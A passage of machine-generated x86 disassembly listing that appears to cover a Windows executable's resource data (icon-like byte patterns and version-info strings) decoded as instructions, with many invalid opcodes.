  41590c:	jmp    ebx
  41590e:	aad    0xff
  415910:	dec    edx
  415912:	mov    bl,0xff
  415914:	fcmovu st,st(6)
  415916:	fdivp  st(7),st
  415918:	fwait
  415919:	popf   
  41591a:	mov    al,ds:0x909293ff
  41591f:	and    DWORD PTR [eax],eax
  415921:	add    BYTE PTR [eax],al
  415923:	add    BYTE PTR [ecx-0x4ef66667],bl
  415929:	mov    ah,0xb2
  41592b:	push   ecx
  41592c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41592d:	test   al,0xa9
  41592f:	mov    eax,0xffb7b7b6
  415934:	fcomp  st(0)
  415936:	fdivr  st,st(7)
  415938:	cld    
  415939:	cld    
  41593a:	cld    
  41593b:	(bad)  
  41593c:	(bad)  
  41593d:	(bad)  
  41593e:	(bad)  
  41593f:	call   eax
  415941:	fsubrp st(3),st
  415943:	call   FWORD PTR [ebx+ebx*2+0x8cff53]
  41594a:	add    bh,bh
  41594c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41594d:	adc    BYTE PTR [eax],al
  41594f:	push   DWORD PTR [edx-0x4000ffe9]
  415955:	sbb    eax,DWORD PTR [eax]
  415957:	dec    ebx
  415959:	push   ds
  41595a:	add    bh,bh
  41595c:	xlat   BYTE PTR ds:[ebx]
  41595d:	and    al,0x0
  41595f:	jmp    ebx
  415961:	and    BYTE PTR [eax],al
  415963:	push   eax
  415965:	push   cs
  415966:	add    bh,bh
  415968:	push   DWORD PTR [eax-0x7000063]
  41596e:	idiv   bh
  415970:	(bad)  
  415971:	(bad)  
  415973:	push   eax
  415975:	xlat   BYTE PTR ds:[ebx]
  415976:	iret   
  415977:	push   DWORD PTR [ebx-0x42005554]
  41597d:	mov    ebp,0xa3adffbd
  415982:	lahf   
  415983:	(bad)  
  415984:	stc    
  415985:	out    0xe2,eax
  415987:	(bad)  
  415988:	push   edx
  41598a:	in     al,dx
  41598b:	(bad)  
  41598c:	push   ebx
  41598e:	out    dx,al
  41598f:	(bad)  
  415990:	(bad)  
  415991:	fadd   st,st(6)
  415993:	(bad)  
  415994:	jmp    0xa7413e7e
  415999:	lods   al,BYTE PTR ds:[esi]
  41599a:	scas   al,BYTE PTR es:[edi]
  41599b:	call   DWORD PTR [eax+0x2c8f90]
	...
  4159a9:	add    BYTE PTR [eax],al
  4159ab:	add    BYTE PTR [esi+eiz*4-0x5f60fa5a],ah
  4159b2:	mov    al,ds:0x91919017
  4159b7:	bound  ebx,QWORD PTR [ecx-0x4c476566]
  4159bd:	mov    ah,0xb4
  4159bf:	repz ret 
  4159c1:	iret   
  4159c2:	sar    bh,cl
  4159c4:	sahf   
  4159c5:	jb     0x415a34
  4159c7:	dec    DWORD PTR [ebp-0x57010000]
  4159cd:	adc    eax,DWORD PTR [eax]
  4159cf:	push   DWORD PTR [ebp-0x3e00ffe4]
  4159d5:	push   ds
  4159d6:	add    bh,bh
  4159d8:	iret   
  4159d9:	and    BYTE PTR [eax],al
  4159db:	(bad)  
  4159dc:	(bad)  [esi]
  4159de:	add    bh,bh
  4159e0:	out    0x18,al
  4159e2:	add    bh,bh
  4159e4:	clc    
  4159e5:	and    al,0x0
  4159e7:	(bad)  
  4159e8:	jmp    edx
  4159ea:	xlat   BYTE PTR ds:[ebx]
  4159eb:	(bad)  
  4159ec:	(bad)  
  4159ed:	(bad)  
  4159ee:	(bad)  
  4159ef:	(bad)  
  4159f0:	(bad)  
  4159f1:	in     eax,dx
  4159f2:	jmp    0xec3259f6
  4159f7:	(bad)  
  4159f8:	out    dx,al
  4159f9:	loop   0x4159d5
  4159fb:	(bad)  
  4159fc:	jmp    0xed4130df
  415a01:	fcmovnbe st,st(2)
  415a03:	(bad)  
  415a04:	std    
  415a05:	out    0xdb,al
  415a07:	(bad)  
  415a08:	jmp    ebp
  415a0a:	aad    0xff
  415a0c:	(bad)  
  415a0d:	fmul   st(1),st
  415a0f:	(bad)  
  415a10:	sti    
  415a11:	mov    ebx,0xe9f3ff9e
  415a16:	in     al,0xff
  415a18:	mov    cl,0xba
  415a1a:	mov    esp,0x8a8b8dff
  415a1f:	push   eax
	...
  415a3c:	xchg   esi,eax
  415a3d:	xchg   esi,eax
  415a3e:	xchg   esi,eax
  415a3f:	or     al,0xae
  415a41:	mov    dh,0xb9
  415a43:	lods   al,BYTE PTR ds:[esi]
  415a44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a45:	popf   
  415a46:	pushf  
  415a47:	call   DWORD PTR [ecx-0x5200fdfb]
  415a4d:	or     BYTE PTR [eax],al
  415a4f:	(bad)  
  415a50:	mov    edx,0xc6ff000d
  415a55:	or     al,BYTE PTR [eax]
  415a57:	call   esp
  415a59:	or     al,BYTE PTR [eax]
  415a5b:	jmp    ebx
  415a5d:	or     BYTE PTR [eax],al
  415a5f:	(bad)  
  415a60:	out    dx,eax
  415a61:	add    BYTE PTR [eax],al
  415a63:	(bad)  
  415a64:	jmp    FWORD PTR [ebx]
  415a66:	add    bh,bh
  415a68:	(bad)  
  415a69:	fcmovnbe st,st(0)
  415a6b:	(bad)  
  415a6c:	std    
  415a6d:	fxch   st(7)
  415a6f:	(bad)  
  415a70:	inc    esi
  415a72:	mov    ch,0xff
  415a74:	cli    
  415a75:	les    esi,FWORD PTR [ecx-0x4f3d0b01]
  415a7b:	(bad)  
  415a7c:	clc    
  415a7d:	shr    DWORD PTR [edi-0x5b440b01],0xff
  415a84:	out    0xb4,al
  415a86:	mov    eax,ds:0xacbae0ff
  415a8b:	jmp    ebx
  415a8d:	lds    edi,FWORD PTR [ecx-0x3b331c01]
  415a93:	push   ebp
  415a95:	div    ch
  415a97:	inc    esp
  415a99:	(bad)  
  415a9a:	leave  
  415a9b:	call   FWORD PTR [ebp+0x3b9b9c]
	...
  415abd:	add    BYTE PTR [eax],al
  415abf:	add    BYTE PTR [edx-0x4e924348],dh
  415ac5:	mov    edx,0x85ffbd
  415aca:	add    bh,bh
  415acc:	mov    eax,ds:0xb3ff0000
  415ad1:	or     BYTE PTR [ebx],al
  415ad3:	(bad)  
  415ad4:	mov    eax,0xbfff0b16
  415ad9:	sub    al,0x1a
  415adb:	dec    esp
  415add:	dec    eax
  415ade:	xor    edi,edi
  415ae0:	(bad)  
  415ae1:	push   edi
  415ae2:	inc    ebp
  415ae3:	call   ecx
  415ae5:	jl     0x415b52
  415ae7:	call   ebp
  415ae9:	scas   al,BYTE PTR es:[edi]
  415aea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415aeb:	call   ecx
  415aed:	mov    dl,0xac
  415aef:	call   eax
  415af1:	mov    ch,0xaf
  415af3:	dec    eax
  415af5:	mov    ebp,0xcac7ffbc
  415afa:	retf   0xcbff
  415afd:	rcl    dl,1
  415aff:	dec    edx
  415b01:	rcl    esp,1
  415b03:	dec    ecx
  415b05:	(bad)  
  415b06:	fucompp 
  415b08:	retf   
  415b09:	fchs   
  415b0b:	int    0xc7
  415b0d:	xlat   BYTE PTR ds:[ebx]
  415b0e:	fsub   QWORD PTR [edx-0x70242937]
  415b14:	iret   
  415b15:	rcl    ebx,1
  415b17:	mov    ecx,edx
  415b19:	aam    0xd4
  415b1b:	push   ecx
	...
  415b40:	mov    bl,0xb5
  415b42:	mov    ecx,0xc4bfb664
  415b47:	call   FWORD PTR [edi-0x5200908d]
  415b4d:	xchg   ecx,eax
  415b4e:	(bad)  
  415b4f:	(bad)  
  415b50:	mov    edx,0xb8ffabad
  415b55:	mov    ebx,0xceb8ffb8
  415b5a:	iret   
  415b5b:	(bad)  
  415b5c:	mov    esp,0xc1ffe5e0
  415b61:	in     eax,dx
  415b62:	repz test eax,0xc4dfefe7
  415b69:	xlat   BYTE PTR ds:[ebx]
  415b6a:	fidivr DWORD PTR [edi-0x5f252a3c]
  415b70:	(bad)
  415b73:	test   eax,ecx
  415b75:	rcl    ebp,1
  415b77:	jae    0x415b41
  415b79:	int    0xce
  415b7b:	push   esp
  415b7c:	(bad)  
  415b7d:	retf   
  415b7e:	int3   
  415b7f:	aas    
  415b80:	(bad)  
  415b81:	int3   
  415b82:	int    0x39
  415b84:	enter  0xcdca,0x25
  415b88:	(bad)  
  415b89:	leave  
  415b8a:	enter  0xc61d,0xc8
  415b8e:	leave  
  415b8f:	shufps xmm1,xmm0,0xc9
  415b93:	or     eax,0x4c9c8c3
  415b98:	(bad)  
  415b99:	leave  
  415b9a:	retf   
  415b9b:	push   es
  415b9c:	retf   
  415b9d:	iret   
  415b9e:	rol    BYTE PTR [edx],cl
	...
  415bc0:	call   0xbdbc:0xba0c9c99
  415bc7:	mov    ds:0xbee8e6ce,eax
  415bcc:	enter  0xe3e1,0x96
  415bd0:	leave  
  415bd1:	fstp   st(7)
  415bd3:	imul   ecx,edx,0xffffffdd
  415bd6:	loope  0x415c27
  415bd8:	retf   
  415bd9:	xlat   BYTE PTR ds:[ebx]
  415bda:	fidivr DWORD PTR [eax]
  415bdc:	retf   0xd2d1
  415bdf:	cs enter 0xcccd,0x1e
  415be4:	enter  0xcac9,0xe
	...
  415d20:	(bad)  
  415d21:	(bad)  
  415d22:	(bad)  
  415d23:	(bad)  
  415d24:	(bad)  
  415d25:	(bad)  
  415d26:	(bad)  
  415d27:	(bad)  
  415d28:	(bad)  
  415d29:	inc    BYTE PTR [eax]
  415d2b:	(bad)  
  415d2c:	(bad)  
  415d2d:	cld    
  415d2e:	add    BYTE PTR [ebx-0x1],dh
  415d31:	lock add BYTE PTR [ecx],al
  415d34:	push   eax
  415d36:	add    BYTE PTR [eax],al
  415d38:	jmp    eax
  415d3a:	add    BYTE PTR [eax],al
  415d3c:	push   eax
  415d3e:	add    BYTE PTR [eax],al
  415d40:	cmp    BYTE PTR [eax],0x0
  415d43:	add    al,BYTE PTR [eax-0x7ffcfff4]
  415d49:	add    al,BYTE PTR [eax]
  415d4b:	add    eax,DWORD PTR [eax-0x7ffd0000]
  415d51:	add    BYTE PTR [eax],al
  415d53:	add    eax,DWORD PTR [eax-0x7ffd0000]
  415d59:	add    BYTE PTR [eax],al
  415d5b:	add    DWORD PTR [eax-0x7fff0000],eax
  415d61:	add    BYTE PTR [eax],al
  415d63:	add    DWORD PTR [eax-0x7fff0000],eax
  415d69:	add    BYTE PTR [eax],al
  415d6b:	add    DWORD PTR [eax-0x7fff0000],eax
  415d71:	add    BYTE PTR [eax],al
  415d73:	add    DWORD PTR [eax-0x80000000],eax
  415d79:	add    BYTE PTR [eax],al
  415d7b:	add    BYTE PTR [eax-0x80000000],al
  415d81:	add    BYTE PTR [eax],al
  415d83:	add    al,ah
  415d85:	add    BYTE PTR [eax],al
  415d87:	add    dh,bh
  415d89:	add    BYTE PTR [eax],al
  415d8b:	add    bh,bh
  415d8d:	add    BYTE PTR [eax],al
  415d8f:	add    edi,edi
  415d91:	add    BYTE PTR [eax],al
  415d93:	add    bh,bh
  415d95:	add    BYTE PTR [edi],bh
  415d97:	(bad)  
  415d98:	(bad)  
  415d99:	(bad)  
  415d9a:	(bad)  
  415d9b:	(bad)  
  415d9c:	(bad)  
  415d9d:	(bad)  
  415d9e:	(bad)  
  415d9f:	jmp    FWORD PTR [eax]
  415da1:	add    BYTE PTR [eax],al
  415da3:	add    BYTE PTR [eax],dl
  415da5:	add    BYTE PTR [eax],al
  415da7:	add    BYTE PTR [eax],ah
  415da9:	add    BYTE PTR [eax],al
  415dab:	add    BYTE PTR [ecx],al
  415dad:	add    BYTE PTR [eax],ah
  415daf:	add    BYTE PTR [eax],al
  415db1:	add    BYTE PTR [eax],al
  415db3:	add    BYTE PTR [eax+0x4],al
	...
  415e06:	add    BYTE PTR [eax],al
  415e08:	xchg   ecx,eax
  415e09:	nop
  415e0a:	nop
  415e0b:	(bad)  
  415e0c:	jnp    0x415e87
  415e0e:	jns    0x415e0f
  415e10:	xchg   ecx,eax
  415e11:	nop
  415e12:	nop
  415e13:	inc    DWORD PTR [eax]
	...
  415e1d:	add    BYTE PTR [eax],al
  415e1f:	add    BYTE PTR [ebx-0x44004344],bh
  415e25:	mov    esp,0xb5b4ffbc
  415e2a:	mov    ch,0xff
  415e2c:	fwait
  415e2d:	pushf  
  415e2e:	pushf  
  415e2f:	call   FWORD PTR [ebx-0x60006364]
  415e35:	mov    al,ds:0xa0a0ffa0
  415e3a:	mov    al,ds:0xff
	...
  415e47:	add    BYTE PTR [esp+esi*4-0x6b6b2c4c],dh
  415e4e:	xchg   esp,eax
  415e4f:	call   FWORD PTR [esi+0xcd9e9e]
	...
  415e5d:	add    BYTE PTR [eax],al
  415e5f:	add    dl,dl
  415e61:	rcl    dl,cl
  415e63:	or     al,0xc9
  415e66:	leave  
  415e67:	inc    esp
  415e69:	mov    dh,0xff
  415e6c:	mov    ecx,0xaaffbaba
  415e71:	stos   DWORD PTR es:[edi],eax
  415e72:	stos   DWORD PTR es:[edi],eax
  415e73:	jmp    DWORD PTR [eax-0x5f005f60]
  415e79:	mov    al,ds:0x61a0
	...
  415e86:	add    BYTE PTR [eax],al
  415e88:	stos   DWORD PTR es:[edi],eax
  415e89:	stos   DWORD PTR es:[edi],eax
  415e8a:	stos   DWORD PTR es:[edi],eax
  415e8b:	idiv   DWORD PTR [edi-0x5a004041]
  415e91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e93:	inc    DWORD PTR [eax]
	...
  415ea1:	add    BYTE PTR [eax],al
  415ea3:	add    dh,bl
  415ea5:	(bad)  
  415ea7:	ss mov ecx,0x8affbaba
  415ead:	mov    cl,BYTE PTR [edx-0x68686801]
  415eb3:	in     al,dx
  415eb4:	mov    al,ds:0x36a0a0
	...
  415ec5:	add    BYTE PTR [eax],al
  415ec7:	add    BYTE PTR [esi-0x2e085152],ch
  415ecd:	rcl    ecx,1
  415ecf:	jmp    FWORD PTR [ebx-0x3c005455]
  415ed5:	(bad)  
  415ed6:	les    eax,FWORD PTR [esi-0x3e3e40]
  415edc:	mov    esi,0xbbffbfbf
  415ee1:	mov    esp,0xb9b8ffbc
  415ee6:	mov    ecx,0xb6b6b5ff
  415eeb:	jmp    FWORD PTR [edx-0x57005556]
  415ef1:	test   al,0xa8
  415ef3:	jmp    DWORD PTR [esi-0x5b00595a]
  415ef9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415efa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415efb:	jmp    DWORD PTR [edx-0x5f005d5e]
  415f01:	mov    al,ds:0xa0a0ffa0
  415f06:	mov    al,ds:0xadadad95
  415f0b:	not    ecx
  415f0d:	rcl    ecx,1
  415f0f:	jmp    FWORD PTR [ebx-0x32005455]
  415f15:	iret   
  415f16:	iret   
  415f17:	dec    ebp
  415f19:	iret   
  415f1a:	iret   
  415f1b:	dec    ebp
  415f1d:	into   
  415f1e:	iret   
  415f1f:	dec    esp
  415f21:	into   
  415f22:	into   
  415f23:	dec    ebx
  415f25:	int    0xcd
  415f27:	dec    edx
  415f29:	int3   
  415f2a:	int3   
  415f2b:	inc    edi
  415f2d:	leave  
  415f2e:	leave  
  415f2f:	inc    esi
  415f31:	leave  
  415f32:	leave  
  415f33:	inc    esi
  415f35:	leave  
  415f36:	leave  
  415f37:	inc    ebp
  415f39:	enter  0xffc8,0xc5
  415f3d:	enter  0xffc8,0xc4
  415f41:	mov    edi,0xa0a0a0ff
  415f47:	jmp    FWORD PTR [ebp-0x2e085253]
  415f4d:	rcl    ecx,1
  415f4f:	jmp    FWORD PTR [ebx-0x31005455]
  415f55:	rcl    al,1
  415f57:	jmp    FWORD PTR [ebp-0x58005152]
  415f5d:	(bad)  
  415f5e:	ud0    ebp,DWORD PTR [ebx-0x5700f2ed]
  415f65:	push   cs
  415f66:	push   cs
  415f67:	jmp    FWORD PTR [ecx-0x4b00dfe0]
  415f6d:	aas    
  415f6e:	das    
  415f6f:	call   esp
  415f71:	sbb    eax,DWORD PTR [ecx]
  415f73:	call   esp
  415f75:	sbb    eax,0x1dd8ff01
  415f7a:	add    bh,bh
  415f7c:	retf   
  415f7d:	and    eax,0xc8c5ff03
  415f82:	enter  0xa1ff,0xa1
  415f86:	mov    eax,ds:0xaeaeaeff
  415f8b:	not    ecx
  415f8d:	rcl    ecx,1
  415f8f:	jmp    FWORD PTR [esp+ebp*4-0x2e300054]
  415f96:	sar    edi,1
  415f98:	stos   DWORD PTR es:[edi],eax
  415f99:	lods   al,BYTE PTR ds:[esi]
  415f9a:	lods   al,BYTE PTR ds:[esi]
  415f9b:	push   DWORD PTR [edx-0x4c00dcd4]
  415fa1:	xor    DWORD PTR [edx],esp
  415fa3:	(bad)  
  415fa4:	mov    ecx,0xc9ff0c1d
  415fa9:	(bad)
  415fac:	int3   
  415fad:	jno    0x416012
  415faf:	call   edi
  415fb1:	inc    edi
  415fb2:	sub    al,0xff
  415fb4:	fiadd  WORD PTR [eax+0x25]
  415fb7:	jmp    ebx
  415fb9:	inc    esp
  415fba:	daa    
  415fbb:	(bad)  
  415fbc:	fnstsw WORD PTR [ebx]
  415fbe:	adc    bh,bh
  415fc0:	(bad)  
  415fc1:	mov    edi,0xa3a3a3ff
  415fc7:	call   DWORD PTR [esi+0xf7a3bd]
  415fcd:	repnz dec eax
  415fcf:	jmp    DWORD PTR [edx-0x3e]
  415fd2:	cmp    bh,0xcf
  415fd5:	rcl    ecx,1
  415fd7:	jmp    FWORD PTR [ecx-0x4b005657]
  415fdd:	inc    eax
  415fde:	xor    eax,0x222fb4ff
  415fe3:	call   edi
  415fe5:	(bad)  
  415fe6:	aad    0xff
  415fe8:	out    dx,al
  415fe9:	out    dx,al
  415fea:	out    dx,al
  415feb:	(bad)  
  415fec:	clc    
  415fed:	clc    
  415fee:	clc    
  415fef:	push   DWORD PTR [ebx-0x24007873]
  415ff5:	pop    eax
  415ff6:	cmp    edi,edi
  415ff8:	fstp   QWORD PTR [ecx+eax*2-0x1]
  415ffc:	fimul  WORD PTR [edi+0x2d]
  415fff:	inc    ebp
  416001:	enter  0xffc8,0xa5
  416005:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416006:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416007:	jmp    FWORD PTR [ebx+0x48f7abab]
  41600d:	inc    esp
  41600e:	inc    ebx
  41600f:	(bad)  
  416010:	jnp    0x41608b
  416012:	jns    0x416013
  416014:	rcl    edx,1
  416016:	sar    bh,cl
  416018:	mov    ds:0xb8ffa3a3,eax
  41601d:	inc    ebx
  41601e:	cmp    bh,bh
  416020:	rol    BYTE PTR [ecx+0x34],0xff
  416024:	fmul   st(2),st
  416026:	leave  
  416027:	(bad)  
  416028:	fcomp  DWORD PTR [edx]
  41602a:	add    bh,bh
  41602c:	aam    0x82
  41602e:	jne    0x41602f
  416030:	(bad)  
  416031:	(bad)  
  416032:	(bad)  
  416033:	call   esi
  416035:	push   0x53
  416037:	call   ebp
  416039:	ins    BYTE PTR es:[edi],dx
  41603a:	pop    ecx
  41603b:	(bad)  
  41603c:	fisub  DWORD PTR [edx+0x48]
  41603f:	inc    edi
  416041:	retf   0xffca
  416044:	stos   DWORD PTR es:[edi],eax
  416045:	stos   DWORD PTR es:[edi],eax
  416046:	stos   DWORD PTR es:[edi],eax
  416047:	(bad)  
  416048:	mov    esi,0xbe94bebe
  41604d:	mov    esi,0xbebeffbe
  416052:	mov    esi,0xd2d2d0c0
  416057:	jmp    DWORD PTR [edx-0x43005d5e]
  41605d:	das    
  41605e:	and    al,0xff
  416060:	lds    ebx,FWORD PTR [ecx+ecx*1]
  416063:	(bad)  
  416064:	ficomp DWORD PTR [esi]
  416066:	add    bh,bh
  416068:	out    0x1b,al
  41606a:	add    bh,bh
  41606c:	call   FWORD PTR [ecx+0x36]
  41606f:	push   ebx
  416071:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416072:	nop
  416073:	(bad)  
  416074:	(bad)  
  416076:	fcos   
  416078:	jmp    FWORD PTR [edx+0x3c]
  41607b:	(bad)  
  41607c:	jmp    DWORD PTR [ebp+0x31]
  41607f:	inc    edi
  416081:	retf   0xffca
  416084:	lods   eax,DWORD PTR ds:[esi]
  416085:	scas   al,BYTE PTR es:[edi]
  416086:	scas   al,BYTE PTR es:[edi]
  416087:	inc    DWORD PTR [eax]
	...
  416091:	add    BYTE PTR [eax],al
  416093:	add    cl,dl
  416095:	rcl    bl,cl
  416097:	jmp    DWORD PTR [eax-0x3a005f60]
  41609d:	sbb    BYTE PTR [edi],al
  41609f:	call   esp
  4160a1:	sbb    BYTE PTR [ecx],al
  4160a3:	jmp    ebx
  4160a5:	es add bh,bh
  4160a8:	in     eax,dx
  4160a9:	sbb    al,BYTE PTR [eax]
  4160ab:	(bad)  
  4160ac:	push   DWORD PTR [eax+0x4b]
  4160af:	(bad)  
  4160b0:	jmp    FWORD PTR [ebx+0x48]
  4160b3:	jmp    ecx
  4160b5:	loope  0x416098
  4160b7:	inc    eax
  4160b9:	mov    edx,0x6bffffb8
  4160be:	aas    
  4160bf:	dec    eax
  4160c1:	retf   0xffcb
  4160c4:	mov    al,0xb1
  4160c6:	mov    cl,0xff
	...
  4160d4:	rcl    edx,1
  4160d6:	sar    edi,cl
  4160d8:	mov    al,ds:0xcaffa0a0
  4160dd:	add    al,0x4
  4160df:	(bad)  
  4160e0:	fmul   QWORD PTR [edi]
  4160e2:	add    bh,bh
  4160e4:	call   0xf84060fb
  4160e9:	push   ss
  4160ea:	add    bh,bh
  4160ec:	(bad)  
  4160ed:	jg     0x41612b
  4160ef:	call   esi
  4160f1:	sbb    BYTE PTR [edi+edi*8-0x29],0x83
  4160f6:	pop    ecx
  4160f7:	(bad)  
  4160f8:	fiadd  DWORD PTR [ecx+0x73dfff51]
  4160fe:	inc    ebx
  4160ff:	dec    ecx
  416101:	retf   
  416102:	retf   
  416103:	push   DWORD PTR [edx+0xffb3b3]
	...
  416111:	add    BYTE PTR [eax],al
  416113:	add    cl,dl
  416115:	rcl    bl,cl
  416117:	jmp    DWORD PTR [eax-0x5f005f60]
  41611d:	mov    al,ds:0xa0a0ffa0
  416122:	mov    al,ds:0xa2a2a2ff
  416127:	jmp    DWORD PTR [esp+eiz*4-0x5152005c]
  41612e:	scas   al,BYTE PTR es:[edi]
  41612f:	push   DWORD PTR [eax-0x4d004f50]
  416135:	mov    bl,0xb3
  416137:	push   DWORD PTR [ebp-0x4700494a]
  41613d:	mov    ecx,0xcbc9ffb9
  416142:	int3   
  416143:	push   DWORD PTR [ebp+0xffb6b6]
	...
  416151:	add    BYTE PTR [eax],al
  416153:	add    cl,dl
  416155:	rcl    bl,cl
  416157:	js     0x41612a
  416159:	rcl    bl,cl
  41615b:	call   ecx
  41615d:	rcl    bl,cl
  41615f:	call   ecx
  416161:	rcl    bl,cl
  416163:	call   eax
  416165:	rcl    dl,cl
  416167:	call   eax
  416169:	rcl    edx,1
  41616b:	dec    esi
  41616d:	rcl    al,1
  41616f:	dec    ebp
  416171:	iret   
  416172:	iret   
  416173:	dec    ebp
  416175:	iret   
  416176:	iret   
  416177:	dec    esp
  416179:	into   
  41617a:	into   
  41617b:	dec    ebx
  41617d:	int    0xcd
  41617f:	dec    edx
  416181:	int3   
  416182:	int3   
  416183:	(bad)  
  416184:	mov    eax,0x95b9b9
	...
  4161c5:	add    BYTE PTR [eax],al
  4161c7:	add    bh,bh
  4161c9:	inc    DWORD PTR [eax]
  4161cb:	add    BYTE PTR [edi+eax*1],bl
  4161ce:	add    BYTE PTR [eax],al
  4161d0:	sbb    al,0x7
  4161d2:	add    BYTE PTR [eax],al
  4161d4:	push   ds
  4161d5:	sldt   WORD PTR [eax]
	...
  4161f4:	loopne 0x4161f6
  4161f6:	add    BYTE PTR [eax],al
  4161f8:	loopne 0x4161fa
  4161fa:	add    BYTE PTR [eax],al
  4161fc:	loopne 0x4161fe
  4161fe:	add    BYTE PTR [eax],al
  416200:	loopne 0x416202
  416202:	add    BYTE PTR [eax],al
  416204:	(bad)  
  416205:	inc    DWORD PTR [eax]
  416207:	add    BYTE PTR [eax],al
  416209:	add    BYTE PTR [ecx],al
  41620b:	add    BYTE PTR [edx],cl
  41620d:	add    BYTE PTR [eax],dh
  41620f:	xor    BYTE PTR [eax],dl
  416211:	add    BYTE PTR [ecx],al
  416213:	add    BYTE PTR [eax+eax*1],al
  416216:	push   0x1000006
  41621b:	add    BYTE PTR [eax],ah
  41621d:	and    BYTE PTR [eax],dl
  41621f:	add    BYTE PTR [ecx],al
  416221:	add    BYTE PTR [eax+eax*1],al
  416224:	call   0x241622b
  416229:	add    BYTE PTR [eax],dl
  41622b:	adc    BYTE PTR [eax],dl
  41622d:	add    BYTE PTR [ecx],al
  41622f:	add    BYTE PTR [eax+eax*1],al
  416232:	sub    BYTE PTR [ecx],al
  416234:	add    BYTE PTR [eax],al
  416236:	add    eax,DWORD PTR [eax]
  416238:	xor    BYTE PTR [eax],dh
  41623a:	add    BYTE PTR [eax],al
  41623c:	add    DWORD PTR [eax],eax
  41623e:	or     BYTE PTR [eax],al
  416240:	test   al,0xe
  416242:	add    BYTE PTR [eax],al
  416244:	add    al,0x0
  416246:	and    BYTE PTR [eax],ah
  416248:	add    BYTE PTR [eax],al
  41624a:	add    DWORD PTR [eax],eax
  41624c:	or     BYTE PTR [eax],al
  41624e:	test   al,0x8
  416250:	add    BYTE PTR [eax],al
  416252:	add    eax,0x101000
  416257:	add    BYTE PTR [ecx],al
  416259:	add    BYTE PTR [eax],cl
  41625b:	add    BYTE PTR [eax+0x5],ch
  41625e:	add    BYTE PTR [eax],al
  416260:	push   es
  416261:	add    BYTE PTR [eax],al
  416263:	add    BYTE PTR [eax],al
  416265:	add    BYTE PTR [ecx],al
  416267:	add    BYTE PTR [eax],ah
  416269:	add    al,ch
  41626b:	mov    bh,0x0
  41626d:	add    BYTE PTR [edi],al
  41626f:	add    BYTE PTR [eax],dh
  416271:	xor    BYTE PTR [eax],al
  416273:	add    BYTE PTR [ecx],al
  416275:	add    BYTE PTR [eax],ah
  416277:	add    BYTE PTR [eax+0x8000025],ch
  41627d:	add    BYTE PTR [eax],ah
  41627f:	and    BYTE PTR [eax],al
  416281:	add    BYTE PTR [ecx],al
  416283:	add    BYTE PTR [eax],ah
  416285:	add    BYTE PTR [eax+0x9000010],ch
  41628b:	add    BYTE PTR [eax],dl
  41628d:	adc    BYTE PTR [eax],al
  41628f:	add    BYTE PTR [ecx],al
  416291:	add    BYTE PTR [eax],ah
  416293:	add    BYTE PTR [eax+0x4],ch
  416296:	add    BYTE PTR [eax],al
  416298:	or     al,BYTE PTR [eax]
  41629a:	add    BYTE PTR [eax],al
  41629c:	add    BYTE PTR [eax],al
  41629e:	add    BYTE PTR [eax],al
  4162a0:	xor    BYTE PTR [esp+esi*1],al
  4162a3:	add    BYTE PTR [eax],al
  4162a5:	add    BYTE PTR [esi+0x0],dl
  4162a8:	push   ebx
  4162a9:	add    BYTE PTR [edi+0x0],bl
  4162ac:	push   esi
  4162ad:	add    BYTE PTR [ebp+0x0],al
  4162b0:	push   edx
  4162b1:	add    BYTE PTR [ebx+0x0],dl
  4162b4:	dec    ecx
  4162b5:	add    BYTE PTR [edi+0x0],cl
  4162b8:	dec    esi
  4162b9:	add    BYTE PTR [edi+0x0],bl
  4162bc:	dec    ecx
  4162bd:	add    BYTE PTR [esi+0x0],cl
  4162c0:	inc    esi
  4162c1:	add    BYTE PTR [edi+0x0],cl
  4162c4:	add    BYTE PTR [eax],al
  4162c6:	add    BYTE PTR [eax],al
  4162c8:	mov    ebp,0xfeef04
  4162cd:	add    BYTE PTR [ecx],al
  4162cf:	add    BYTE PTR [eax],al
  4162d1:	add    BYTE PTR [edx],cl
  4162d3:	add    BYTE PTR [eax],al
  4162d5:	inc    eax
  4162d6:	add    BYTE PTR [eax],ch
  4162d8:	add    BYTE PTR [eax],al
  4162da:	or     al,BYTE PTR [eax]
  4162dc:	add    BYTE PTR [eax+0x0],al
  4162df:	sub    BYTE PTR [edi],bh
  4162e1:	add    BYTE PTR [eax],al
  4162e3:	add    BYTE PTR [eax],al
  4162e5:	add    BYTE PTR [eax],al
  4162e7:	add    BYTE PTR [eax+eax*1],al
  4162ea:	add    al,0x0
  4162ec:	add    DWORD PTR [eax],eax
	...
  4162fa:	add    BYTE PTR [eax],al
  4162fc:	mov    es,WORD PTR [ebx]
  4162fe:	add    BYTE PTR [eax],al
  416300:	add    DWORD PTR [eax],eax
  416302:	push   ebx
  416303:	add    BYTE PTR [eax+eax*1+0x72],dh
  416307:	add    BYTE PTR [ecx+0x0],ch
  41630a:	outs   dx,BYTE PTR ds:[esi]
  41630b:	add    BYTE PTR [edi+0x0],ah
  41630e:	inc    esi
  41630f:	add    BYTE PTR [ecx+0x0],ch
  416312:	ins    BYTE PTR es:[edi],dx
  416313:	add    BYTE PTR [ebp+0x0],ah
  416316:	dec    ecx
  416317:	add    BYTE PTR [esi+0x0],ch
  41631a:	data16 add BYTE PTR [edi+0x0],ch
  41631e:	add    BYTE PTR [eax],al
  416320:	push   0x3
  416322:	add    BYTE PTR [eax],al
  416324:	add    DWORD PTR [eax],eax
  416326:	xor    BYTE PTR [eax],al
  416328:	xor    al,0x0
  41632a:	xor    BYTE PTR [eax],al
  41632c:	cmp    DWORD PTR [eax],eax
  41632e:	xor    BYTE PTR [eax],al
  416330:	xor    al,0x0
  416332:	inc    edx
  416333:	add    BYTE PTR [eax],dh
  416335:	add    BYTE PTR [eax],al
  416337:	add    BYTE PTR [eax+eax*1+0x16],cl
  41633b:	add    BYTE PTR [ecx],al
  41633d:	add    BYTE PTR [ebx+0x0],al
  416340:	outs   dx,DWORD PTR ds:[esi]
  416341:	add    BYTE PTR [ebp+0x0],ch
